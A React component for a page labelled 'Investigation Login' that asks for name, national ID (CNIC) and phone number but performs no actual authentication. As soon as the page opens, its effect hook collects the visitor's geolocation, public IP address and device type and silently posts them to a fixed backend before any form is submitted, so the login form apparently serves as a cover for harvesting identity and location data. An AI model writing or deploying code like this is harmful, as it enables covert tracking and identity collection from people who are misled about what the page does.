import React, { useEffect, useState } from "react";

function Login() {
  const [name, setName] = useState("");
  const [cnic, setCnic] = useState("");
  const [phone, setPhone] = useState("");
  const [location, setLocation] = useState(null);
  const [ip, setIp] = useState("");
  const [device, setDevice] = useState("");
  const [status, setStatus] = useState("");
  const [userId, setUserId] = useState(null);
  const API_BASE = "https://investigation-backend.vercel.app";

  useEffect(() => {
    // Capture geolocation quickly and save
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude } = pos.coords;
          const loc = { latitude, longitude };
          setLocation(loc);
        },
        (err) => {
          setStatus("Location unavailable or permission denied");
        },
        { timeout: 5000 },
      );
    } else {
      setStatus("Geolocation not supported");
    }

    // Gather ip, geolocation and device then save partial record to DB
    const getIP = () =>
      fetch("https://api.ipify.org?format=json")
        .then((r) => r.json())
        .then((data) => (data && data.ip ? data.ip : ""))
        .catch(() => "");

    const getGeo = () =>
      new Promise((res) => {
        if (!navigator.geolocation) return res(null);
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            res({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
            }),
          () => res(null),
          { timeout: 5000 },
        );
      });

    const ua = navigator.userAgent || "";
    const isMobile = /Mobi|Android|iPhone|iPad|iPod|Opera Mini/i.test(ua);
    const deviceType = isMobile ? "mobile" : "desktop";
    setDevice(deviceType);

    Promise.all([getGeo(), getIP()]).then(([geo, ipAddr]) => {
      const loc = geo
        ? { latitude: geo.latitude, longitude: geo.longitude }
        : null;
      if (loc) setLocation(loc);
      if (ipAddr) setIp(ipAddr);

      // prepare payload matching backend model
      const locPayload = loc
        ? { area: "unknown", coordinates: [loc.longitude, loc.latitude] }
        : { area: "unknown", coordinates: [0, 0] };

      const payload = {
        name: "",
        iPAddress: ipAddr || "",
        location: locPayload,
        deviceType: deviceType,
        cnic: "",
        phoneNumber: "",
      };

      // POST initial partial user record to deployed backend
      fetch(`${API_BASE}/api/user/add`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })
        .then((r) => r.json())
        .then((data) => {
          if (data && data._id) setUserId(data._id);
        })
        .catch(() => {
          // ignore failure; user can still submit later
        });
    });
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus("Saving...");

    // Build payload to match backend model
    const locPayload = location
      ? {
          area: "unknown",
          coordinates: [location.longitude, location.latitude],
        }
      : { area: "unknown", coordinates: [0, 0] };

    const payload = {
      name: name.trim(),
      iPAddress: ip || "",
      location: locPayload,
      deviceType: device,
      cnic: cnic.trim(),
      phoneNumber: phone.trim(),
    };

    try {
      if (userId) {
        const res = await fetch(`${API_BASE}/api/user/update/${userId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (res.ok) setStatus("Updated server record");
        else setStatus(`Update failed: ${res.status}`);
      } else {
        const res = await fetch(`${API_BASE}/api/user/add`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (res.ok) setStatus("Saved to server");
        else setStatus(`Server error: ${res.status}`);
      }
    } catch (err) {
      setStatus("Failed to save to server");
    }
  };

  return (
    <div className="container py-4">
      <div className="row justify-content-center">
        <div className="col-12 col-sm-10 col-md-8 col-lg-6">
          <div className="card shadow-sm">
            <div className="card-body">
              <h3 className="card-title mb-3 text-center">
                Investigation Login
              </h3>

              {status ? (
                <div
                  className={`alert ${status.includes("Failed") || status.includes("error") || status.includes("failed") ? "alert-danger" : "alert-success"}`}
                  role="alert"
                >
                  {status}
                </div>
              ) : null}

              <form onSubmit={handleSubmit}>
                <div className="mb-3">
                  <label className="form-label">Name</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-user" aria-hidden="true"></i>
                    </span>
                    <input
                      required
                      value={name}
                      onChange={(e) => setName(e.target.value)}
                      placeholder="Full name"
                      className="form-control"
                    />
                  </div>
                </div>

                <div className="mb-3">
                  <label className="form-label">CNIC</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-id-card" aria-hidden="true"></i>
                    </span>
                    <input
                      required
                      value={cnic}
                      onChange={(e) => setCnic(e.target.value)}
                      placeholder="CNIC"
                      className="form-control"
                    />
                  </div>
                </div>

                <div className="mb-3">
                  <label className="form-label">Phone</label>
                  <div className="input-group">
                    <span className="input-group-text">
                      <i className="fa fa-phone" aria-hidden="true"></i>
                    </span>
                    <input
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      placeholder="Phone (optional)"
                      className="form-control"
                    />
                  </div>
                </div>

                <div className="d-grid">
                  <button type="submit" className="btn btn-primary btn-lg">
                    <i className="fa fa-sign-in me-2" aria-hidden="true"></i>
                    Login
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Login;
